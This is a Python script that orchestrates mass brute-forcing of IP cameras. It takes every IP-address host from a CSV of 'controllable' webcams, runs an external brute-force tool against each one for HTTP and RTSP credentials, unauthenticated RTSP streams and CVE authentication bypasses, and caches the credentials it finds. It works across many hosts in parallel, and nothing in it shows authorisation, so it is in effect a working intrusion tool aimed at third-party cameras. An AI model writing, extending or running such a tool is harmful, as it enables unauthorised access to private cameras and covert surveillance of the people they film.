"""cam_mass_bruteforce.py — Run ultimate_bruteforce.py against every IP cam in our CSV.

Targets only IP-cam entries (host looks like IP address) — NOT public cams.

Strategy:
1. Get unique IPs from CSV
2. For each IP, run ultimate_bruteforce with detected brand
3. If creds found, update CSV with auth_user/auth_pass
4. Cache results per IP
"""
import csv
import json
import os
import re
import subprocess
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

CSV_PATH = r'C:\Users\eli6-admin\Documents\eli6-surveillance\controllable_Webcams.csv'
LOG_PATH = r'C:\Users\eli6-admin\Documents\eli6-surveillance\bruteforce\mass_bf_log.txt'
CACHE_PATH = r'C:\Users\eli6-admin\Documents\eli6-surveillance\backups\cam_bruteforce_results.json'
ULTIMATE_BF = r'C:\Users\eli6-admin\Documents\eli6-surveillance\bruteforce\ultimate_bruteforce.py'

PYTHON = r'C:\Users\eli6-admin\AppData\Local\Programs\Python\Python312\python.exe'


def log(msg):
    line = f'[{time.strftime("%H:%M:%S")}] {msg}'
    print(line, flush=True)
    try:
        with open(LOG_PATH, 'a', encoding='utf-8') as f:
            f.write(line + '\n')
    except Exception:
        pass


def load_cache():
    if os.path.exists(CACHE_PATH):
        try:
            with open(CACHE_PATH, 'r') as f:
                return json.load(f)
        except Exception:
            return {}
    return {}


def save_cache(cache):
    os.makedirs(os.path.dirname(CACHE_PATH), exist_ok=True)
    with open(CACHE_PATH, 'w') as f:
        json.dump(cache, f, indent=1)


def run_ultimate(target, port=80, rtsp=True, cve=True, wordlist='top5'):
    """Run ultimate_bruteforce.py on a target, parse output."""
    try:
        result = subprocess.run(
            [PYTHON, ULTIMATE_BF, target, '--port', str(port),
             '--rtsp-port', '554', '--rtsp', '--cve', '--wordlist', wordlist],
            capture_output=True, text=True, timeout=90
        )
        out = result.stdout
        # Parse: look for success lines
        success = {}
        if 'HTTP AUTH OK:' in out:
            m = re.search(r'HTTP AUTH OK: ([^\s]+):([^\s]+)', out)
            if m:
                success['http_creds'] = f'{m.group(1)}:{m.group(2)}'
        if 'HTTP AUTH OK' in out:
            m = re.search(r'HTTP AUTH OK: ([^\s]+):([^\s]+)', out)
            if m:
                success['http_creds'] = f'{m.group(1)}:{m.group(2)}'
        if 'CVE BYPASS:' in out:
            cves = re.findall(r'CVE BYPASS: (\w+)', out)
            success['cves'] = cves
        if 'RTSP UNAUTH OK:' in out:
            m = re.search(r'RTSP UNAUTH OK: ([^\s]+)', out)
            if m:
                success['rtsp_unauth'] = m.group(1)
        if 'RTSP AUTH OK:' in out:
            m = re.search(r'RTSP AUTH OK: ([^\s]+):([^\s]+) @ ([^\s]+)', out)
            if m:
                success['rtsp_creds'] = f'{m.group(1)}:{m.group(2)}'
                success['rtsp_path'] = m.group(3)
        success['raw_output'] = out[:2000]
        success['timestamp'] = time.time()
        return success
    except subprocess.TimeoutExpired:
        return {'error': 'timeout'}
    except Exception as e:
        return {'error': str(e)}


def main():
    log('[init] starting mass cam brute-force')
    cache = load_cache()
    log(f'[cache] {len(cache)} cached results')

    with open(CSV_PATH, 'r', encoding='utf-8', newline='') as f:
        rows = list(csv.reader(f))
    header = rows[0]

    cols = {h: i for i, h in enumerate(header)}
    HOST = cols['host']
    AUTH_USER = cols.get('auth_user', None)
    AUTH_PASS = cols.get('auth_pass', None)
    AUTH_REQ = cols.get('auth_required', None)

    # Find unique IPs with port in url
    unique_ips = set()
    for r in rows[1:]:
        h = r[HOST].strip() if len(r) > HOST else ''
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', h):
            unique_ips.add(h)
    log(f'[plan] {len(unique_ips)} unique IPs')

    # Only bruteforce those without auth_user set yet
    ips_to_bf = []
    for ip in unique_ips:
        if ip not in cache:
            ips_to_bf.append(ip)
    log(f'[plan] {len(ips_to_bf)} IPs to brute-force')

    def bf_one(ip):
        return ip, run_ultimate(ip, port=80, rtsp=True, cve=True, wordlist='top5')

    new_results = 0
    done = 0
    with ThreadPoolExecutor(max_workers=3) as ex:
        futures = {ex.submit(bf_one, ip): ip for ip in ips_to_bf[:50]}
        for f in as_completed(futures):
            done += 1
            try:
                ip, result = f.result()
            except Exception as e:
                continue
            cache[ip] = result
            new_results += 1
            if result.get('http_creds') or result.get('cves') or result.get('rtsp_unauth') or result.get('rtsp_creds'):
                log(f'  [+] {ip} -> {result}')
            else:
                log(f'  [-] {ip} no hits')
            if done % 10 == 0:
                save_cache(cache)
                log(f'  progress {done}/{len(ips_to_bf)}, total cached {len(cache)}')

    save_cache(cache)
    log(f'[done] {new_results} new results, {len(cache)} total cached')


if __name__ == '__main__':
    main()
